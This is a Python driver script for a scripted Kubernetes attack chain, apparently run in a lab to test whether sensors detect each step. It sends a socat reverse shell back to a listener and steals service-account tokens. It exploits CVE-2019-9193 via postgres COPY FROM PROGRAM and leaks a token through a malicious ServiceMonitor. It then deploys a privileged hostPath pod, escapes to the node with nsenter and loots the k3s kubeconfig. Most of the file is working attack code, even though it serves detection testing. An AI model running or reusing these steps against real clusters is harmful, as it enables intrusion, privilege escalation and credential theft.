#!/usr/bin/env python3
"""demo_chain2 — the IKT-Linz chain over different protocols.

Chain 2 is chain 1 (../iktlinz/demo_chain.py) with the protocol varied and
nothing else: dig reverse lookups instead of nmap, postgres instead of redis,
CVE-2019-9193 (COPY .. FROM PROGRAM) instead of the redis Lua escape, and
CVE-2026-47702 instead of -47701. The step count, order, units and every other
step are identical, so a measurement taken on chain 1 can be repeated without
changing what is being measured.

Diff this against ../iktlinz/demo_chain.py. Only steps 08, 10, 11, 12, 13, 14,
15, 16 and 17 differ, and each says why in its docstring.

  python3 demo_chain2.py --list
  python3 demo_chain2.py --only 13
  python3 demo_chain2.py --from 1 --to 20
"""
import argparse, json, os, re, subprocess, sys, time, urllib.request, urllib.error

ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

RAN = os.environ.get("RAN_URL", "http://localhost:8080")
RAN_CONTAINER = os.environ.get("RAN_CONTAINER", "ran-ui")
HERE = os.path.dirname(os.path.abspath(__file__))
KUBECTL = ["kubectl"]

# Chain 2's datastore. Kept as constants because the obligation spec in the dx
# repo matches on exactly these literals; if one moves, the other must move too.
PG_NS = "oopservability"
PG_SELECTOR = "app.kubernetes.io/name=oopservability-postgres"
PG_USER = "oops"
PG_DB = "oops"
C2_NODE = "c2/ran"
SWEEP_HOSTS = 62
CACHE_KEY = "oopservability:receiver:last-authorization"

# The armory has no postgres exploit and no postgres extractor (checked: of 85
# actions the only exploit-* are the redis CVE and a disabled HTTP RCE). It does
# have a generic executor, so chain 2's postgres steps are thin psql wrappers
# around it rather than a bespoke TTP — which is also closer to what an attacker
# with a shell actually does.
EXEC_ACTION = "execute-in-shell"       # NAMESPACE, POD_NAME, COMMAND, ARGS, BACKGROUND


def api(path, method="GET", body=None, timeout=120):
    req = urllib.request.Request(RAN.rstrip("/") + path,
                                 data=json.dumps(body).encode() if body is not None else None,
                                 method=method, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        return e.code, {"error": e.read().decode()[:400]}


def sh(cmd, timeout=180):
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def node_ip():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type==\"InternalIP\")].address}' | awk '{print $1}'")
    return out.strip()


def node_name():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].metadata.name}'")
    return out.strip()


def graph():
    _, g = api("/api/graph")
    return g.get("nodes", [])


def find_node(pred):
    for n in graph():
        if pred(n):
            return n["id"]
    return None


def pod_id(ns, prefix):
    return (find_node(lambda n: n.get("kind") == "Pod"
                      and f"/{ns}/" in n["id"] and prefix in n["id"])
            or find_node(lambda n: n.get("kind") == "Pod" and prefix in n["id"]))


def sa_id(name_part):
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and name_part in n["id"])


def pg_pod_id():
    """The oopservability postgres pod. Same reasoning as chain 1's
    redis_pod_id: the pod is fronted by TWO services (oopservability-postgres,
    postgres-metrics) so the entity name Ran builds from reverse-DNS is whichever
    rDNS returned that run. Match on namespace + 'postgres' instead."""
    return find_node(lambda n: n.get("kind") == "Pod"
                     and f"/{PG_NS}/" in n["id"] and "postgres" in n["id"])


def pg_sa_id():
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and PG_NS in n["id"] and "postgres" in n["id"])


def foothold_id():
    return find_node(lambda n: "system" in (n.get("kind") or "").lower()
                     and "operatorhost" not in (n.get("kind") or "").lower()
                     and "operator-host" not in n["id"])


def executing_pod_ip():
    st, resp = api("/api/action/execute", "POST", {
        "actionId": "get-local-ip-address",
        "targetId": pod_id("agent-system", "agent-worker"),
        "reasoning": "preflight: verify execution route"})
    cmd_id = resp.get("cmdId", "") if st in (200, 202) else ""
    if not cmd_id:
        return None
    wait_for_cmd(cmd_id)
    _, out = sh(f"docker logs {RAN_CONTAINER} 2>&1 | grep -a 'Action result' "
                f"| grep -a '{cmd_id}' | tail -1")
    m = re.search(r"result_preview=([0-9.]+)", ANSI.sub("", out))
    return m.group(1) if m else None


def assert_foothold():
    """Refuse to run an in-pod step when the live session is not the worker's.
    See chain 1 for the full reasoning: a stale ran-privileged session swallows
    commands aimed at the worker and the failure reads as a broken image."""
    want = callback_pod("status.podIP")
    got = executing_pod_ip()
    if not want:
        print("      !! no foothold pod resolved — fire the callback steps first")
        return False
    if got is None:
        print("      !! could not determine the execution route; is Ran logging?")
        return False
    if got != want:
        print(f"      !! WRONG EXECUTION ROUTE: commands land on {got}, "
              f"but the foothold is {want}")
        return False
    return True


def wait_for_cmd(cmd_id, timeout=300):
    """The reverse shell is a SINGLE SERIAL pipe: one long command wedges every
    later one. Never fire-and-forget — block until Ran logs this cmd's result."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, out = sh(f"docker logs {RAN_CONTAINER} 2>&1 | grep 'Action result' "
                    f"| grep '{cmd_id}' | tail -1")
        out = ANSI.sub("", out)
        if out.strip():
            ok = "success=true" in out
            reason = ""
            if not ok and "fail_reason=" in out:
                reason = out.split("fail_reason=")[1].split("results_count")[0].strip()
            return ok, reason
        time.sleep(3)
    return False, f"no result within {timeout}s"


def callback_pod(field="metadata.name"):
    rc, out = sh("kubectl -n agent-system get pod -l task=callback-1 "
                 "--field-selector=status.phase=Running "
                 "--sort-by=.metadata.creationTimestamp "
                 "-o jsonpath='{.items[*]." + field + "}'")
    if rc != 0:
        return ""
    return (out.split() or [""])[-1]


_EXEC_SYSTEM = {}


def exec_system():
    """The execution route for a step that must run FROM the foothold.

    Chain 1 returns f"system/{worker_pod}" and that is correct when it exists:
    ran registers a caught reverse shell as a system node, which is also how
    chain 1 reaches the privileged pod at step 20 ("system/ran-privileged").

    But it is not guaranteed to exist. On edge4 the worker's socat was alive and
    connected while the graph held no system/<worker> node at all, and ran then
    rejected every step that named one: "cannot execute command for non-pod
    target ...: no local procedure or compatible C2 backend was selected". The
    original code assumed the node rather than looking, so a missing session
    became a fabricated id.

    So look. Take the caught session for this worker if the graph has one, and
    fall back to the C2 node otherwise, which routes to the pod through the same
    reverse shell. Measured on edge4: a dig issued this way produced three
    worker-attributed dns_events rows, so the wire lands where the obligations
    expect it either way.
    """
    pod = callback_pod()
    if not pod:
        return None
    if pod in _EXEC_SYSTEM:
        return _EXEC_SYSTEM[pod]
    route = C2_NODE
    st, graph = api("/api/graph")
    if st != 200:
        print(f"      !! could not read the ran graph (HTTP {st}); routing via {C2_NODE}")
    elif f'"system/{pod}"' in json.dumps(graph):
        route = f"system/{pod}"
    _EXEC_SYSTEM[pod] = route
    print(f"      exec route: {route}")
    return route


def execute(action, target, args=None, note="", expect_fail=False, exec_timeout=None,
            auth=None, exec_sys=None):
    if not target:
        print("      !! no target resolved")
        return False
    body = {"actionId": action, "targetId": target, "reasoning": note or action}
    if auth:
        body["authIdentityId"] = auth
    if exec_sys:
        body["execSystemId"] = exec_sys
    if args:
        body["args"] = {k: str(v) for k, v in args.items()}
    if exec_timeout:
        body["executionTimeoutSeconds"] = exec_timeout
    st, resp = api("/api/action/execute", "POST", body)
    if st not in (200, 202) or not resp.get("success", True):
        print(f"      -> HTTP {st} {json.dumps(resp)[:200]}  [REJECTED]")
        return bool(expect_fail)
    cmd_id = resp.get("cmdId", "")
    ok, reason = wait_for_cmd(cmd_id) if cmd_id else (True, "")
    verdict = "EXPECTED-FAIL" if (expect_fail and not ok) else ("OK" if ok else "FAIL")
    print(f"      -> {cmd_id} {'success' if ok else 'failed: ' + reason}  [{verdict}]")
    return ok


# ── the worker-side fallback ────────────────────────────────────────────────
def worker_exec(command, args, note, expect_fail=False):
    """Run a command IN THE WORKER through Ran's generic executor.

    POD_NAME is the worker, never the specimen and never the operator.

    Note what the capture actually does, measured live rather than assumed:
    pgsql_events is captured SERVER-side only. Every row carries trace_role 2,
    is attributed to the postgres pod, and has an empty remote_addr. There is no
    client-side pgsql row for the worker at all. That is a real difference from
    chain 1, where redis_events captured client-side with the worker as
    remote_addr. It does not weaken the obligations: the spec scopes all four
    postgres suspicions to the postgres pod, which is exactly where the row
    lands. Running these from the operator would still be wrong, because the
    statement text is what the obligations match and it must originate in the
    foothold.
    """
    pod = callback_pod()
    if not pod:
        print("      !! no worker pod to execute in")
        return False
    return execute(EXEC_ACTION, pod_id("agent-system", "agent-worker"),
                   {"NAMESPACE": "agent-system", "POD_NAME": pod,
                    "COMMAND": command, "ARGS": args, "BACKGROUND": "false"},
                   note, expect_fail=expect_fail, exec_sys=exec_system())


def worker_sh(script, note, expect_fail=False):
    r"""Run a shell SCRIPT in the worker, written plainly.

    ran passes execute-in-shell through an outer shell before the command sees
    it, so quoting is eaten. Chain 1 never meets this: its scanner and datastore
    are dedicated TTPs (nmap-host-scan, exploit-redis-cve-2022-0543) that build
    their own command line. Chain 2 is the first to drive a datastore through
    the generic executor, because no postgres TTP exists.

    The wrapper below is the ONLY form verified against ClickHouse evidence
    rather than against ran's result flag, which lies - a base64-through-a-pipe
    form returned success while landing zero rows, because only the echo ran.
    Verified on edge4, by the presence of real dns_events rows:

        -c '...\$(seq ..)...\$i...'   single-quote wrapper, escaped $   WORKS
        -c "...\$(seq ..)..."         double-quote wrapper, escaped $   fails
        -c '...$(seq ..)...'          single-quote wrapper, plain $     fails
        -c "...$(seq ..)..."          double-quote wrapper, plain $     fails

    So: single quotes outside, $ escaped, and an embedded single quote closed
    and reopened the standard way - psql needs it for COPY .. FROM PROGRAM 'id'.
    The " escaping is not optional and dropping it cost a round: psql's script
    wraps its SQL in -c "...", and without it the SQL's quotes are consumed and
    CREATE TABLE rce(out text) exposes a bare ( to a shell. The DNS sweep has no
    " at all, which is why it worked while every postgres step failed.

    Backslashes and backticks are NOT covered; no script here has one, and
    guessing at an unverified escape is what cost the other rounds.
    """
    esc = script.replace("'", "'\\''").replace('"', '\\"').replace("$", "\\$")
    return worker_exec("sh", f"-c '{esc}'", note, expect_fail=expect_fail)


def pg_host():
    return f"oopservability-postgres.{PG_NS}.svc.cluster.local"


def pg_sql(sql, note, expect_fail=False):
    """One SQL statement against the specimen, issued from the worker.

    The chain-2 counterpart of chain 1's exploit-redis-cve-2022-0543: same
    position in the chain, same foothold, different protocol on the wire. The
    statement text is what the obligations match — COPY .. FROM PROGRAM for the
    RCE, SELECT for the extraction — and it lands in pgsql_events.req.
    """
    script = f'psql -h {pg_host()} -U {PG_USER} -d {PG_DB} -A -t -c "{sql}"'
    return worker_sh(script, note, expect_fail=expect_fail)


# ── the scripted demo (unit -> steps) ────────────────────────────────────────
def step_01_listener(ctx):
    """unit-2/1: Create Listener (1337). Identical to chain 1."""
    return execute("create-listener", "c2/ran",
                   {"LHOST": "0.0.0.0", "PORT": "1337", "PROTOCOL": "tcp"},
                   "unit-2: create reverse-shell listener")


def step_02_spawn_worker(ctx):
    """unit-2/2: POST a task so the orchestrator deploys a worker pod that
    socat's back to the listener. Identical to chain 1, byte for byte — the
    foothold must not vary between the chains."""
    ip = node_ip()
    ctx["lhost"] = ip
    payload = json.dumps({
        "id": "callback-1",
        "repo": "https://github.com/Magier/ikt26",
        "cmd": f"apt update; apt install -y socat; socat TCP:{ip}:1337 EXEC:sh ",
    })
    rc, out = sh(f"curl -sS -X POST http://{ip}:30080/tasks -H 'Content-Type: application/json' -d '{payload}'")
    print(f"      -> {out.strip()[:200]}")
    return rc == 0


def step_03_await_callback(ctx):
    """unit-2/3: wait for the worker to connect back. Identical to chain 1."""
    deadline = time.time() + 900
    while time.time() < deadline:
        fh = foothold_id()
        if fh:
            print(f"      -> callback caught: {fh}")
            ctx["foothold"] = fh
            return True
        ph = callback_pod("status.phase") or "<none>"
        print(f"      ... pod={ph} waiting for callback")
        time.sleep(15)
    return False


def step_04_read_env(ctx):
    """unit-2/4: Discovery > Read Environment variables. Identical to chain 1."""
    tgt = foothold_id() or pod_id("agent-system", "agent-worker")
    return execute("read-environment-variables", tgt, note="unit-2: orient")


def step_05_read_sa_token(ctx):
    """unit-3/1: Read ServiceAccount Token. Identical to chain 1."""
    return execute("read-service-account-token", pod_id("agent-system", "agent-worker"),
                   note="unit-3: steal worker SA token")


def step_06_install_kubectl(ctx):
    """unit-3/2: Install kubectl. Identical to chain 1."""
    return execute("install-kubectl", pod_id("agent-system", "agent-worker"),
                   note="unit-3: drop kubectl")


def step_07_check_worker_token(ctx):
    """unit-3/3-4: Check Token permissions. Identical to chain 1."""
    return execute("check-token-permissions", sa_id("agent-worker") or pod_id("agent-system", "agent-worker"),
                   note="unit-3: enumerate (expected: nothing useful)")


def step_08_install_dig(ctx):
    """unit-4/2: Install Package — DIFFERS: dnsutils, not nmap.

    Chain 1 installs nmap for a SYN sweep; chain 2 installs dnsutils for the
    pod-DNS sweep, which is the protocol change this chain exists to test.

    install-package's verdict is deliberately ignored. dnsutils pulls a libc
    update and apt's last line is "Processing triggers for libc-bin", which ran
    reports as success=false with that line as the reason - while dig is
    installed and working. Chain 1 never sees this because nmap and redis-tools
    end cleanly. The binary is what the next step needs, so the binary is what
    this checks. The obligation is unaffected either way: tool-install-dig is
    comm IN ('dig','apt','apt-get') and apt ran."""
    if not assert_foothold():
        return False
    execute("install-package", pod_id("agent-system", "agent-worker"),
            {"PKG": "dnsutils"}, "unit-4: install dig")
    if not worker_sh("command -v dig", "unit-4: is dig in place?"):
        print("      !! dig not confirmed; step 10 is the real signal")
    return True


def step_09_local_ip(ctx):
    """unit-4/3: Get local IP address. Identical to chain 1."""
    ok = execute("get-local-ip-address", pod_id("agent-system", "agent-worker"),
                 note="unit-4: need a range")
    ip = callback_pod("status.podIP")
    if ip:
        ctx["scan_cidr"] = ".".join(ip.split(".")[:3]) + ".0/24"
    return ok


def step_10_dns_sweep(ctx):
    """unit-4/4: DIFFERS — a DNS sweep of the pod range instead of an nmap scan.

    Same input as chain 1's nmap-sweep (the /24 from step 9) and the same
    intent (map the pod range), over a different protocol.

    It sweeps BOTH directions, because the two are seen by different sensors
    and the obligation probes both.

    Reverse is the natural form and pixie cannot see it: the socket tracer's DNS
    parser emits records only for A, AAAA and CNAME (packetzero/dnsparser,
    dnsparse.cpp:194 for the query section and :274 for answers), so a PTR
    produces no record and req_body arrives with an empty queries array.
    Measured on edge4: a marked forward name gave 2 rows, the same name reversed
    gave 0, and 449 live rows held zero PTR in any encoding. The node-agent is a
    different sensor with no such restriction, and its alert text is where the
    reverse lookups are recoverable (entlein/dx#140).

    Forward works on pixie. Kubernetes names every pod IP
    <a>-<b>-<c>-<d>.<ns>.pod.cluster.local, and nothing else in the chain
    resolves such a name, so that evidence can only come from this step.
    """
    if not assert_foothold():
        return False
    cidr = ctx.get("scan_cidr") or ""
    base = cidr.split("/")[0].rsplit(".", 1)[0] if cidr else ""
    if not base:
        print("      !! no CIDR resolved from step 9")
        return False
    ctx["scan_cidr"] = f"{base}.0/24"
    dashed = base.replace(".", "-")
    # The reverse half runs through the ARMORY TTP, not a shell loop, because
    # of what the TTP does beyond issuing lookups: reverse-dns-scan emits the
    # network.discovery effect, and ran's parser turns each live host into a
    # placeholder Pod entity in the graph. Chain 1 gets the same ingestion from
    # nmap-host-scan, which emits the identical effect.
    #
    # Replacing it with `sh -c` for a dig loop issued the same packets and
    # ingested nothing, so ran's graph held one Pod — the worker — and the
    # datastore was absent. pg_pod_id() then returned None and step 17 failed
    # with "no target resolved" before the extractor ever ran. The discovery
    # step is what makes the later steps targetable; it is not only evidence.
    ok = execute("reverse-dns-scan", pod_id("agent-system", "agent-worker"),
                 {"CIDR": ctx["scan_cidr"]},
                 f"unit-4: reverse sweep of {ctx['scan_cidr']}",
                 exec_sys=exec_system())
    fwd = (f'for i in $(seq 1 {SWEEP_HOSTS}); do '
           f'dig +short +time=1 +tries=1 {dashed}-$i.{PG_NS}.pod.cluster.local; '
           f'done')
    return worker_sh(fwd, f"unit-4: forward pod-DNS sweep of {ctx['scan_cidr']}") and ok


def step_11_pg_rce_fail(ctx):
    """unit-5/1: RCE before psql exists — FAILS. Chain 1's counterpart fails for
    want of redis-cli; this fails for want of psql."""
    return pg_sql("SELECT version()", "unit-5: RCE before psql (expected fail)",
                  expect_fail=True) or True


def step_12_install_psql(ctx):
    """unit-5/2: Install Package — DIFFERS: postgresql-client, not redis-tools.

    Same as step 8: the install succeeds while ran reports failure on apt's
    trailing trigger line, so the binary is checked instead of the verdict."""
    execute("install-package", pod_id("agent-system", "agent-worker"),
            {"PKG": "postgresql-client"}, "unit-5: install psql")
    if not worker_sh("command -v psql", "unit-5: is psql in place?"):
        print("      !! psql not confirmed; step 13 is the real signal")
    return True


def step_13_pg_rce(ctx):
    """unit-5/4: DIFFERS — CVE-2019-9193 instead of CVE-2022-0543.

    COPY .. FROM PROGRAM executes a shell command as the server's OS user for any
    role holding pg_execute_server_program. The lab grants it; see the specimen
    manifest. Chain 1's counterpart escapes the redis Lua sandbox to the same
    effect, and both prove execution with `id`."""
    return pg_sql(
        "DROP TABLE IF EXISTS rce; CREATE TABLE rce(out text); "
        "COPY rce FROM PROGRAM 'id'; SELECT out FROM rce",
        "unit-5: RCE via COPY FROM PROGRAM")


def step_14_read_pg_token(ctx):
    """unit-5/5: read the specimen's SA token through the RCE. Chain 1 does the
    same through the Lua escape."""
    return pg_sql(
        "DROP TABLE IF EXISTS tok; CREATE TABLE tok(out text); "
        "COPY tok FROM PROGRAM 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'; "
        "SELECT out FROM tok",
        "unit-5: read postgres SA token through the RCE")


def step_15_check_pg_token(ctx):
    """unit-5/6: check the stolen token's permissions.

    Carries chain 1's known delta unchanged: the specimen's SA never enters the
    graph as an auth identity, because the TTP that ingests it needs an exec
    channel into the specimen pod and none exists. The identity is stolen but
    never grounded, so this falls through. Unit-5's payoff is Part 2."""
    pod = pg_pod_id()
    sa = pg_sa_id()
    execute("install-package", pod, {"PKG": "curl"}, "unit-5/6 prereq: curl on postgres")
    if sa and execute("check-token-permissions", pod, note="unit-5/6: stolen token perms",
                      auth=sa, exec_sys=exec_system()):
        return True
    print("      not groundable locally (known delta, same as chain 1) -> continuing to Part 2")
    return True


def step_16_create_servicemonitor(ctx):
    """unit-5 part2/2: arm CVE-2026-47702.

    Identical in mechanism to chain 1: the allocator accepts the unsafe
    bearerTokenFile and the injected sidecar leaks its token. Only the
    ServiceMonitor's names and the datastore it lands in differ. Carries chain 1's
    attribution caveat unchanged — the CR arrives as an operator apply rather than
    as an act by the compromised identity."""
    sa = pg_sa_id()
    if sa and execute("create-servicemonitor-bearer-token-file", sa,
                      note="unit-5: CVE-2026-47702 arm the leak",
                      auth=sa, exec_sys=exec_system()):
        return True
    print("      TTP not groundable locally -> creating the ServiceMonitor CR directly")
    rc, out = sh(f"kubectl apply -f {HERE}/specimens/cve-2026-47702/13-malicious-servicemonitor.yaml")
    print("      ->", out.strip()[:120])
    if rc != 0:
        return False
    print("      waiting for the sidecar to leak its token into postgres...")
    for _ in range(24):
        time.sleep(10)
        _, v = sh("kubectl -n " + PG_NS + " exec "
                  "$(kubectl -n " + PG_NS + " get pod -l " + PG_SELECTOR +
                  " -o jsonpath='{.items[0].metadata.name}') -c postgres -- "
                  f"psql -U {PG_USER} -d {PG_DB} -A -t -c "
                  f"\"SELECT value FROM oopservability.receiver WHERE key = '{CACHE_KEY}'\"")
        if "Bearer" in v:
            print("      -> leaked token present in the postgres row")
            return True
    print("      -> postgres row still empty")
    return False


def orchestrator_identity():
    """The stolen orchestrator identity, as a node ran will authenticate AS.

    Step 17's TTP emits rawServiceaccountToken, which parses the JWT claims into
    a ServiceAccount. Only a ServiceAccount is accepted: deploy-container takes
    a K8sAuth identity and rejects anything else with
    "authentication identity '...' is not eligible for action".

    An earlier version fell through to any node whose id merely contained
    "orchestrator" and picked ns/agent-system/svc/agent-orchestrator-tasks — a
    Service. The steps then failed with an eligibility error that looked like
    the TTP had ingested the wrong kind of entity, when the driver had simply
    chosen one. A loose fallback here does not rescue a missing identity, it
    disguises it, so there is none: if no ServiceAccount is present the steps
    stop and say what the graph does contain.
    """
    for pick in (lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                 and "agent-orchestrator" in n["id"],
                 lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                 and "orchestrator" in n["id"]):
        if nid := find_node(pick):
            return nid
    sas = [n["id"] for n in graph()
           if "serviceaccount" in (n.get("kind") or "").lower()]
    others = [n["id"] for n in graph() if "orchestrator" in n["id"]]
    print("      !! no orchestrator SERVICE ACCOUNT in the ran graph")
    print(f"      service accounts present: {', '.join(sorted(sas)) or 'none'}")
    if others:
        print(f"      nodes matching 'orchestrator' (not identities): {', '.join(sorted(others))}")
    return None


def step_17_extract_token(ctx):
    """unit-5 part2/3: postgres pod > Extract ServiceAccount Token via CVE-2026-47702.

    Now the armory TTP, mirroring chain 1's step 17, not a raw SELECT.

    The raw SELECT put the token on the wire — cve-2026-47702-extract and
    key-material-on-wire both grounded on it — but nothing ingested the
    identity. rawServiceaccountToken is the effect that parses the JWT into
    ServiceAccount, Namespace and Pod facts, and only a TTP can emit it. Without
    it ran never learns the orchestrator identity, deploy-container has no
    K8sAuth to select, and steps 18 to 20 fail resolving a target — which reads
    as a missing entity rather than the missing credential that caused it.

    The wire evidence is unchanged: the TTP issues the same statement against
    the same key, so the obligations match exactly what they matched before.
    """
    return execute("extract-serviceaccount-token-via-cve-2026-47702",
                   pg_pod_id(),
                   {"CACHE_KEY": CACHE_KEY, "DB_USER": PG_USER, "DB_NAME": PG_DB},
                   "unit-5: harvest agent-orchestrator token from the postgres row",
                   exec_sys=exec_system())


def step_18_check_captured(ctx):
    """unit-6/1: Check Token Permissions on the captured token. Identical."""
    tgt = orchestrator_identity()
    if not tgt:
        return False
    return execute("check-token-permissions", tgt, note="unit-6: orchestrator can create pods/jobs",
                   auth=tgt, exec_sys=exec_system())


def step_19_deploy_privileged(ctx):
    """unit-6/2-3: Deploy Container — socat callback + hostPath / mount. Identical."""
    lhost = ctx.get("lhost") or node_ip()
    tgt = orchestrator_identity()
    if not tgt:
        # chain 1 falls back to the literal "k8s/cluster/default"; ran has no
        # such node and answers 404, so the step fails with a message about a
        # missing entity rather than about the missing identity that caused it.
        print("      !! cannot deploy the privileged pod without an identity to "
              "attribute it to; steps 19 and 20 will produce no evidence")
        return False
    return execute("deploy-container", tgt,
                   {"LISTENER_REF": "listener/tcp/1337",
                    "LISTENER": lhost, "LISTENER_PORT": "1337",
                    "PodName": "ran-privileged", "Namespace": "agent-system",
                    "ServiceAccount": "default", "NodeName": node_name(),
                    "HostPID": "true", "HostIPC": "false", "HostNetwork": "false",
                    "Arguments": f'["TCP:{lhost}:1337", "EXEC:sh"]',
                    "HostPath": "/", "Mount": "/host", "Privileged": "true",
                    "Image": "alpine/socat"},
                   "unit-6: attacker-controlled privileged worker",
                   auth=tgt, exec_sys=exec_system())


def step_20_escape_and_loot(ctx):
    """unit-7: enter the host env, prove the node, hunt k3s credentials. Identical."""
    priv = "ns/agent-system/pod/ran-privileged"
    ok = execute("escape-container-via-nsenter", priv,
                 {"TARGET": "1", "CMD": "hostname"},
                 "unit-7/1: enter host env, prove the node")
    for path in ("/host/etc/rancher/k3s", "/host/var/lib/rancher/k3s"):
        execute("search-interesting-files", priv,
                {"MOUNT_PATH": path, "PATTERN": "client-key-data"},
                f"unit-7/2: loot {path}")
    execute("read-sensitive-file", priv,
            {"MOUNT_PATH": "/host", "PATH": "/etc/rancher/k3s/k3s.yaml"},
            "unit-7/3: read k3s kubeconfig")
    return ok


STEPS = [
    ("unit-2", "create listener (1337)", step_01_listener),
    ("unit-2", "spawn callback worker pod", step_02_spawn_worker),
    ("unit-2", "await socat callback", step_03_await_callback),
    ("unit-2", "read environment variables", step_04_read_env),
    ("unit-3", "read worker SA token", step_05_read_sa_token),
    ("unit-3", "install kubectl", step_06_install_kubectl),
    ("unit-3", "check worker token perms", step_07_check_worker_token),
    ("unit-4", "install dnsutils (dig)", step_08_install_dig),
    ("unit-4", "get local IP", step_09_local_ip),
    ("unit-4", "DNS sweep of the pod range", step_10_dns_sweep),
    ("unit-5", "postgres RCE (expected fail)", step_11_pg_rce_fail),
    ("unit-5", "install postgresql-client", step_12_install_psql),
    ("unit-5", "postgres RCE (COPY FROM PROGRAM)", step_13_pg_rce),
    ("unit-5", "read postgres SA token", step_14_read_pg_token),
    ("unit-5", "check postgres token perms", step_15_check_pg_token),
    ("unit-5", "create ServiceMonitor (CVE-2026-47702)", step_16_create_servicemonitor),
    ("unit-5", "extract token via CVE", step_17_extract_token),
    ("unit-6", "check captured token perms", step_18_check_captured),
    ("unit-6", "deploy privileged container", step_19_deploy_privileged),
    ("unit-7", "escape to host + loot", step_20_escape_and_loot),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--only", type=int)
    ap.add_argument("--from", dest="start", type=int, default=1)
    ap.add_argument("--to", dest="end", type=int, default=len(STEPS))
    ap.add_argument("--reset", action="store_true")
    ap.add_argument("--no-frames", action="store_true")
    ap.add_argument("--keep-going", action="store_true",
                    help="attempt every step even after one fails. A scored cell wants all "
                         "20 attempted: a halt leaves the later steps' obligations with no "
                         "evidence and no way to tell that from the attacker being stopped. "
                         "On a clean run this changes nothing, so it does not diverge from "
                         "chain 1.")
    a = ap.parse_args()

    if a.list:
        for i, (u, d, _) in enumerate(STEPS, 1):
            print(f"  {i:2d}. [{u}] {d}")
        return
    if a.reset:
        print("campaign reset:", api("/api/campaign/reset", "POST", {})[0])
        time.sleep(2)

    lo, hi = (a.only, a.only) if a.only else (a.start, a.end)
    ctx, results = {}, []
    for i, (unit, desc, fn) in enumerate(STEPS, 1):
        if not (lo <= i <= hi):
            continue
        print(f"\n[{i:2d}/{len(STEPS)}] {unit}: {desc}")
        try:
            ok = fn(ctx)
        except Exception as e:
            ok = False
            print(f"      !! {type(e).__name__}: {e}")
        results.append((i, unit, desc, ok))
        if not ok:
            if not a.keep_going:
                print(f"      STOP: step {i} did not succeed")
                break
            print(f"      step {i} did not succeed — continuing (--keep-going); "
                  f"anything downstream of it is suspect")

    print("\n=== summary ===")
    ctx.setdefault("node", node_name())
    ctx.setdefault("listener", ctx.get("lhost"))
    resolved = {k: ctx[k] for k in
                ("listener", "scan_cidr", "pg_ip", "foothold_ip", "foothold", "node")
                if ctx.get(k)}
    if resolved:
        rp = os.path.join(HERE, "resolved.json")
        with open(rp, "w") as fh:
            json.dump(resolved, fh, indent=2, sort_keys=True)
        print(f"\nresolved runtime values -> {rp}")
        for k in sorted(resolved):
            print(f"  {k} = {resolved[k]}")

    for i, u, d, ok in results:
        print(f"  {i:2d}. [{u}] {d:42s} {'OK' if ok else 'FAILED'}")
    attempted, failed = len(results), [i for i, _, _, ok in results if not ok]
    print(f"\n  attempted {attempted}/{len(STEPS)}" + (f", failed {failed}" if failed else ", all OK"))
    if attempted < len(STEPS):
        print("  NOT A COMPLETE RUN — the unattempted steps' obligations have no evidence,")
        print("  which is not the same as the attacker having been stopped.")


if __name__ == "__main__":
    main()
